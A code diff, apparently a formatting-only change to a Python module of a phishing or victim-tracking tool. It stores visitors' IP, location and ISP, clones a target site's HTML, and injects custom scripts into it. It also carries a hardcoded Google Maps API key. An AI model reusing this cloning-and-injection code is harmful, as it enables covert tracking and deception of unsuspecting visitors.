@@ -24,7 +24,8 @@ class victim(object):
 
 
 class victim_geo(object):
-    def __init__(self, id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua, refer):
+    def __init__(self, id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code,
+                 region_name, time_zone, zip_code, isp, ua, refer):
         self.id = id
         self.city = city
         self.country_code = country_code
@@ -56,7 +57,8 @@ def victim_headers2(ua):
     return {
         "User-Agent": str(ua),
         "Content-Type": "text/html; charset=utf-8",
-        "Accept": "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.8",
+        "Accept": "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg,"
+                  " image/gif, image/x-xbitmap, */*;q=0.8",
         "Connection": "keep-alive",
         # Do Not Track (info here: https://www.w3.org/TR/tracking-dnt/)
         "DNT": "1",
@@ -67,7 +69,8 @@ def victim_headers2(ua):
 def victim_headers(ua):
     return [("User-Agent", ua),
             ("Content-Type", "text/html; charset=utf-8"),
-            ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.8"),
+            ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg,"
+                       " image/gif, image/x-xbitmap, */*;q=0.8"),
             ("Connection", "keep-alive"),
             # Do Not Track (info here: https://www.w3.org/TR/tracking-dnt/)
             ("DNT", "1"),
@@ -75,7 +78,8 @@ def victim_headers(ua):
             ]
 
 
-def victim_inject_code(html, script='a', url_to_clone='', gMapsApiKey='AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM', IpInfoApiKey=''):
+def victim_inject_code(html, script='a', url_to_clone='', gMapsApiKey='AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM',
+                       IpInfoApiKey=''):
     url_to_clone = str(url_to_clone)
     html = html.replace('src="'.encode(), str('src="' + url_to_clone + '/').encode())
     html = html.replace("src='".encode(), str("src='" + url_to_clone + '/').encode())
@@ -94,7 +98,8 @@ def victim_inject_code(html, script='a', url_to_clone='', gMapsApiKey='AIzaSyBUP
     html = html.replace(
         '</head>'.encode(), '<script type="text/javascript" src="/static/js/custom.js"></script></head>'.encode())
     html = html.replace(
-        '</head>'.encode(), str('<script type="text/javascript" src="/static/js/' + script + '.js"></script></head>').encode())
+        '</head>'.encode(), str('<script type="text/javascript" src="/static/js/' + script + '.js"></script></head>')
+            .encode())
     return html
 
 
